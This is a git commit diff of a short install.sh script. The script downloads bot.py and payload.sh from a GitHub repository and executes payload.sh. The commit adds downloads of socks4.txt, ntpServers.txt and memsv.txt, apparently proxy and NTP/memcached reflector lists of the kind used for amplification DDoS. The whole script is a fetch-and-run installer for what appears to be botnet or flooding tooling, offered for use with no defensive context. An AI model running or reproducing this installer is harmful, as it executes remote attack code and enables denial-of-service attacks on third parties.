14210cb54be7576df950926434204261534bb47e
nightowl-devs <151651325+nightowl-devs@users.noreply.github.com>
2023-12-23 12:17:06 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,3 +1,6 @@
 wget https://raw.githubusercontent.com/nightowl-devs/shiny-octo-palm-tree/main/bot.py
 wget https://raw.githubusercontent.com/nightowl-devs/shiny-octo-palm-tree/main/payload.sh
+wget https://raw.githubusercontent.com/nightowl-devs/shiny-octo-palm-tree/main/socks4.txt
+wget https://raw.githubusercontent.com/nightowl-devs/shiny-octo-palm-tree/main/ntpServers.txt
+wget https://raw.githubusercontent.com/nightowl-devs/shiny-octo-palm-tree/main/memsv.txt
 bash payload.sh
